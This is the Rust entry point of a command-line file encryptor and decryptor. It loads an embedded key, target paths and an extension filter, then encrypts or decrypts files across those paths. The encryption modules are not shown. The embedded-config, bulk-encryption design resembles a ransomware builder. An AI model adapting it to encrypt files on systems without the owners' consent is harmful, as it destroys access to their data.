mod utils;
mod models;
mod encrypt;
mod decrypt;

use std::time::Duration;
use crate::models::Config;
use tokio::time::{sleep_until, Instant};
use crate::utils::{get_embedded_config, process_path};
use colored::*;
use rypes::errors::errors::RError;
// C:\Users\yjrur\OneDrive\Рабочий стол\test
#[tokio::main]
async fn main() -> anyhow::Result<()> {
	println!("{}", "══════════════════════════════════════════════".cyan());
	println!("{}", "🔐 File Encryptor/Decryptor v3.0".bright_cyan().bold());
	println!("{}", "══════════════════════════════════════════════".cyan());
	println!();

	let (key, paths, mode, filter_only_target) = match get_embedded_config() {
		Ok(v) => {v},
		Err(re) => {
			eprintln!("{}", format!("❌ get_embedded_config err: {}", re.text).red());
			sleep_until(Instant::now() + Duration::from_secs(5)).await;
			std::process::exit(1);
		}
	};

	let config = Config{key, mode, paths, encrypt_extensions_only: filter_only_target};

	let key_bytes = match hex::decode(&config.key) {
		Ok(bytes) => bytes,
		Err(e) => {
			eprintln!("{}", format!("❌ Invalid key: {}", e).red());
			sleep_until(Instant::now() + Duration::from_secs(5)).await;
			std::process::exit(1);
		}
	};

	if key_bytes.len() != 32 {
		eprintln!("{}", "❌ Key must be 32 bytes".red());
		sleep_until(Instant::now() + Duration::from_secs(5)).await;
		std::process::exit(1);
	}

	let mut key = [0u8; 32];
	key.copy_from_slice(&key_bytes);

	println!("🔑 Mode: {}", if config.mode == "encrypt" { "ENCRYPT" } else { "DECRYPT" }.bright_yellow());
	println!("📁 Paths to process: {}", config.paths.len());
	for path in &config.paths {
		println!("   • {}", path);
	}
	if config.mode == "encrypt" {
		println!("🎯 Filter: {}", if config.encrypt_extensions_only { "Only target extensions" } else { "All except ignored" });
	}
	println!();

	let mut total_processed = 0;
	let mut total_errors = 0;

	for path in &config.paths {
		println!("📂 Processing: {}", path.cyan());
		match process_path(path, &key, &config.mode, config.encrypt_extensions_only) {
			Ok((processed, errors)) => {
				total_processed += processed;
				total_errors += errors;
				println!("   ✅ Processed: {} files, ⚠️ Errors: {}\n", processed, errors);
			}
			Err(e) => {
				total_errors += 1;
				println!("   {} {}\n", "❌ Error:".red(), e.red());
			}
		}
	}

	println!("{}", "══════════════════════════════════════════════".cyan());
	if total_errors == 0 {
		println!("{}", format!("✅ Success! Processed {} files", total_processed).green());
	} else {
		println!("{}", format!("⚠️ Completed with errors: {} processed, {} errors", total_processed, total_errors).yellow());
	}
	println!("{}", "══════════════════════════════════════════════".cyan());

	println!("\nPress Enter to exit...");
	let _ = std::io::stdin().read_line(&mut String::new());

	Ok(())
}